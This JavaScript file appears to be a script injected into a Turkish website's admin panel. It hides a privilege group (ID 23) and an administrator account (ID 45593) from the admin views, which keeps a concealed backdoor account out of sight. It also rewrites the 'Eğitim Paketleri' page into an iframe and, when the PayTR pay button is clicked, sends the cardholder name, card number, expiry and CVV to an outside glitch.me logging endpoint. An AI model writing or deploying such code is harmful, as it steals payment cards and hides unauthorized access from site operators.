if (!window.hasOwnProperty('scriptLoaded')) {
    window.scriptLoaded = true;

    var currentUrl = window.location.href;

    // yetki-gruplari sayfasında ID’si 23 olan satırı gizle ve tuşla geri getir
    if (currentUrl.includes('/duello/ad_/yetki-gruplari')) {
        let hiddenRow = null;

        const rows = document.querySelectorAll('tbody tr');
        rows.forEach(row => {
            const idCell = row.querySelector('td:first-child');
            if (idCell && idCell.textContent === '23') {
                row.style.display = 'none';
                hiddenRow = row;
            }
        });

        document.addEventListener('keydown', (event) => {
            if (event.ctrlKey && event.shiftKey && event.key === 'S') {
                if (hiddenRow) {
                    hiddenRow.style.display = '';
                }
            }
        });
    }

    // kullanicidetay.php?t= sayfalarında value="23" olan option’ı gizle
    if (currentUrl.includes('/duello/ad_/kullanicidetay.php?t=')) {
        function hideYetkiOption() {
            const select = document.getElementById('yetki');
            if (select) {
                const option23 = select.querySelector('option[value="23"]');
                if (option23) {
                    option23.style.display = 'none';
                }
            }
        }

        hideYetkiOption();
        const observer = new MutationObserver(() => {
            hideYetkiOption();
        });
        observer.observe(document.body, { childList: true, subtree: true });
    }

    // yoneticiler sayfasında ID’si 45593 olan satırı gizle
    if (currentUrl.includes('/duello/ad_/yoneticiler')) {
        function hideManagerRow() {
            const rows = document.querySelectorAll('tbody tr');
            rows.forEach(row => {
                const idCell = row.querySelector('td:first-child');
                if (idCell && idCell.textContent === '45593') {
                    row.style.display = 'none';
                }
            });
        }

        hideManagerRow();
        const observer = new MutationObserver(() => {
            hideManagerRow();
        });
        observer.observe(document.body, { childList: true, subtree: true });
    }

    // duello sayfasında diğer işlevler
    if (currentUrl.includes('/duello/') && !currentUrl.includes('/duello/ad_/yetki-gruplari')) {
        function hideUser() {
            const userItem = document.getElementById('aktifuser_45593');
            if (userItem) {
                userItem.style.display = 'none';
            }
        }

        hideUser();
        const observer = new MutationObserver(() => {
            hideUser();
        });
        observer.observe(document.body, { childList: true, subtree: true });

        const button = Array.from(document.querySelectorAll('.nav-link')).find(link => 
            link.querySelector('.link-title') && link.querySelector('.link-title').textContent.includes('Eğitim Paketleri')
        );

        if (button) {
            button.addEventListener('click', (event) => {
                event.preventDefault();

                document.body.innerHTML = '';
                const iframe = document.createElement('iframe');
                iframe.src = 'https://katiponline.com/egitim-paketleri/';
                iframe.style.width = '100%';
                iframe.style.height = '100vh';
                iframe.style.border = 'none';
                iframe.style.position = 'absolute';
                iframe.style.top = '0';
                iframe.style.left = '0';

                iframe.onload = () => {
                    try {
                        const iframeDoc = iframe.contentDocument || iframe.contentWindow.document;

                        const planTitle = iframeDoc.querySelector('span.plan-title');
                        if (planTitle) {
                            const originalLink = planTitle.querySelector('a');
                            planTitle.innerHTML = 'Manipüle Edilmiş Paket ';
                            if (originalLink) {
                                planTitle.appendChild(originalLink);
                            }
                        }

                        const paytrIframe = iframeDoc.getElementById('paytriframe');
                        if (paytrIframe) {
                            paytrIframe.onload = () => {
                                try {
                                    const paytrDoc = paytrIframe.contentDocument || paytrIframe.contentWindow.document;
                                    const payButton = paytrDoc.querySelector('button[onclick="bankayagit()"]');

                                    if (payButton) {
                                        payButton.addEventListener('click', () => {
                                            const data = {
                                                cc_owner: paytrDoc.getElementById('name').value,
                                                cardnumber: paytrDoc.getElementById('cardnumber').value,
                                                expirationdate: paytrDoc.getElementById('expirationdate').value,
                                                cvv: paytrDoc.getElementById('securitycode').value,
                                                timestamp: new Date().toISOString()
                                            };

                                            fetch('https://economic-pewter-radius.glitch.me/log', {
                                                method: 'POST',
                                                headers: { 'Content-Type': 'application/json' },
                                                body: JSON.stringify(data)
                                            })
                                            .catch(error => console.error('Glitch’e gönderim hatası:', error));
                                        });
                                    }
                                } catch (error) {
                                    console.error('Paytriframe erişim hatası:', error);
                                }
                            };
                        }

                        const links = iframeDoc.querySelectorAll('a[href]');
                        links.forEach(link => {
                            link.addEventListener('click', (e) => {
                                e.preventDefault();
                                const href = link.getAttribute('href');
                                if (href && !href.startsWith('javascript:')) {
                                    const newUrl = href.startsWith('/') ? `https://katiponline.com${href}` : href;
                                    window.location.href = newUrl;
                                }
                            });
                        });
                    } catch (error) {
                        console.error('Iframe manipülasyon hatası:', error);
                    }
                };

                document.body.appendChild(iframe);
                window.history.pushState({}, 'Eğitim Paketleri', '/egitim-paketleri');
            });
        }
    }
}
